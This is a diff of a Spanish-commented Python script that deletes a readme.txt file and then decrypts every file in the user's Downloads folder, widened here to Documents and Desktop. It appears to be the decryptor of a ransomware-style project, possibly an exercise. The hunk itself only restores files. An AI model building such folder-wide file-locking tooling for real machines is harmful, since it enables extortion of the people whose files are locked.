@@ -27,15 +27,37 @@ def obtener_archivos_recursivamente(directorio):
 
 if __name__ == "__main__":
     user_profile = os.getenv('USERPROFILE')
-    archivos = os.path.join(user_profile, 'Downloads')
+    descargas = os.path.join(user_profile, 'Downloads')
     
     # Eliminar el archivo readme.txt si existe
-    readme_path = os.path.join(archivos, "readme.txt")
+    readme_path = os.path.join(descargas, "readme.txt")
     if os.path.exists(readme_path):
         os.remove(readme_path)
     
     # Obtener todos los archivos en el directorio y subdirectorios
-    archivos_2 = obtener_archivos_recursivamente(archivos)
+    archivos_descargas = obtener_archivos_recursivamente(descargas)
     
+    documentos = os.path.join(user_profile, 'Documents')
+    
+    # Eliminar el archivo readme.txt si existe
+    readme_path = os.path.join(documentos, "readme.txt")
+    if os.path.exists(readme_path):
+        os.remove(readme_path)
+    
+    # Obtener todos los archivos en el directorio y subdirectorios
+    archivos_documentos = obtener_archivos_recursivamente(documentos)
+
+    escritorio = os.path.join(user_profile, 'Desktop')
+    
+    # Eliminar el archivo readme.txt si existe
+    readme_path = os.path.join(escritorio, "readme.txt")
+    if os.path.exists(readme_path):
+        os.remove(readme_path)
+    
+    # Obtener todos los archivos en el directorio y subdirectorios
+    archivos_escritorio = obtener_archivos_recursivamente(escritorio)
+
     key = retornarKey()
-    decryp(archivos_2, key)
+    decryp(archivos_descargas, key)
+    decryp(archivos_documentos, key)
+    decryp(archivos_escritorio, key)
